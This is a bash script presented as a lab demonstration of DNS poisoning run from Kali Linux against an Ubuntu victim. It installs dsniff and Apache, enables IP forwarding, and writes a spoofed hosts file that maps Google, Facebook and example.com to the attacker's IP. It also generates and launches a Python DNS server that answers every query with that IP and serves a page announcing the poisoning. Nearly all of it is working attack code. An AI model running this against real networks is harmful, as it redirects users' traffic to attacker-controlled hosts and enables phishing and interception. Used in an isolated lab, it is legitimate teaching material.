#!/bin/bash

# ============================================================
#   DNS POISONING DEMO — KALI LINUX (ATTACKER)
#   Run this on: Kali Linux
#   Usage: sudo bash kali_attack.sh
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

print_header() {
    echo -e "\n${RED}======================================${NC}"
    echo -e "${RED}  $1${NC}"
    echo -e "${RED}======================================${NC}\n"
}

print_step() {
    echo -e "${YELLOW}[STEP $1]${NC} ${CYAN}$2${NC}"
}

print_success() {
    echo -e "${GREEN}[✓] $1${NC}"
}

print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

# ============================================================
# STEP 1 — SHOW NETWORK INFO
# ============================================================
print_header "STEP 1 — NETWORK INFORMATION"
print_step "1" "Showing Kali IP address..."
ip a | grep "inet " | grep -v "127.0.0.1"

echo ""
print_step "1b" "Showing Gateway IP..."
ip route | grep default

echo ""
print_info "Write down your Kali IP and Gateway IP before continuing!"
echo -e "${YELLOW}Press Enter to continue...${NC}"
read

# ============================================================
# STEP 2 — INSTALL TOOLS
# ============================================================
print_header "STEP 2 — INSTALLING TOOLS"
print_step "2" "Installing dsniff and apache2..."
sudo apt update -q
sudo apt install -y dsniff apache2 python3-dnslib

print_success "Tools installed!"

# ============================================================
# STEP 3 — ENABLE IP FORWARDING
# ============================================================
print_header "STEP 3 — ENABLE IP FORWARDING"
print_step "3" "Enabling IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
print_success "IP forwarding enabled!"

# ============================================================
# STEP 4 — GET IPs FROM USER
# ============================================================
print_header "STEP 4 — ENTER YOUR NETWORK IPs"
echo -e "${CYAN}Enter your Kali IP (e.g. 192.168.1.13):${NC}"
read KALI_IP

echo -e "${CYAN}Enter your Ubuntu IP (e.g. 192.168.1.10):${NC}"
read UBUNTU_IP

echo -e "${CYAN}Enter your Gateway IP (e.g. 192.168.1.1):${NC}"
read GATEWAY_IP

print_info "Kali IP    : $KALI_IP"
print_info "Ubuntu IP  : $UBUNTU_IP"
print_info "Gateway IP : $GATEWAY_IP"

# ============================================================
# STEP 5 — CREATE FAKE DNS HOSTS FILE
# ============================================================
print_header "STEP 5 — CREATING FAKE DNS HOSTS FILE"
print_step "5" "Writing /etc/dnsspoof.hosts..."

sudo bash -c "cat > /etc/dnsspoof.hosts << EOF
$KALI_IP    www.google.com
$KALI_IP    *.google.com
$KALI_IP    facebook.com
$KALI_IP    example.com
EOF"

echo ""
print_success "DNS hosts file created:"
cat /etc/dnsspoof.hosts

# ============================================================
# STEP 6 — CREATE FAKE WEBPAGE
# ============================================================
print_header "STEP 6 — CREATING FAKE WEBPAGE"
print_step "6" "Starting Apache and creating fake page..."

sudo systemctl start apache2
sudo bash -c "cat > /var/www/html/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>WARNING</title>
    <style>
        body {
            background: #ff0000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .box {
            background: white;
            padding: 50px;
            border-radius: 10px;
            text-align: center;
        }
        h1 { color: red; font-size: 2.5em; }
        p  { color: #333; font-size: 1.2em; }
    </style>
</head>
<body>
    <div class='box'>
        <h1>⚠️ YOU HAVE BEEN DNS POISONED!</h1>
        <p>Attacker: Kali Linux</p>
        <p>Your DNS request was intercepted.</p>
        <p>This is a demonstration for educational purposes.</p>
    </div>
</body>
</html>
EOF"

print_success "Fake webpage created!"

echo ""
print_step "6b" "Verifying Apache is running..."
sudo systemctl status apache2 | grep "Active:"

# ============================================================
# STEP 7 — CREATE PYTHON FAKE DNS SERVER
# ============================================================
print_header "STEP 7 — CREATING FAKE DNS SERVER SCRIPT"
print_step "7" "Writing fakeDNS.py..."

sudo bash -c "cat > /home/$USER/fakeDNS.py << EOF
from dnslib import *
from dnslib.server import *

FAKE_IP = '$KALI_IP'

class FakeDNS(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        reply.add_answer(RR(
            request.q.qname,
            QTYPE.A,
            rdata=A(FAKE_IP),
            ttl=60
        ))
        print(f'[DNS SPOOF] {request.q.qname} --> {FAKE_IP}')
        return reply

print('=========================================')
print(f'  Fake DNS Server Running on port 53')
print(f'  All queries redirected to: {FAKE_IP}')
print('=========================================')

resolver = FakeDNS()
server = DNSServer(resolver, port=53, address='0.0.0.0')
server.start_thread()
print('Listening for DNS queries...')
print('Press Enter to stop...')
input()
server.stop()
print('DNS server stopped.')
EOF"

print_success "fakeDNS.py created at /home/$USER/fakeDNS.py"

# ============================================================
# STEP 8 — LAUNCH ATTACK
# ============================================================
print_header "STEP 8 — LAUNCHING ATTACK"
echo -e "${RED}[!] Starting Fake DNS Server...${NC}"
echo -e "${YELLOW}[!] Switch to Ubuntu now and run the ubuntu_victim.sh script!${NC}"
echo -e "${YELLOW}[!] Press Ctrl+C here ONLY when demo is complete.${NC}\n"

sudo python3 /home/$USER/fakeDNS.py

# ============================================================
# STEP 9 — CLEANUP AFTER DEMO
# ============================================================
print_header "STEP 9 — CLEANUP"
print_step "9" "Stopping Apache..."
sudo systemctl stop apache2
print_success "Apache stopped!"

print_step "9b" "Disabling IP forwarding..."
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
print_success "IP forwarding disabled!"

print_success "Attack cleanup complete!"
echo -e "\n${GREEN}======================================${NC}"
echo -e "${GREEN}  KALI ATTACK SCRIPT COMPLETE!${NC}"
echo -e "${GREEN}======================================${NC}\n"

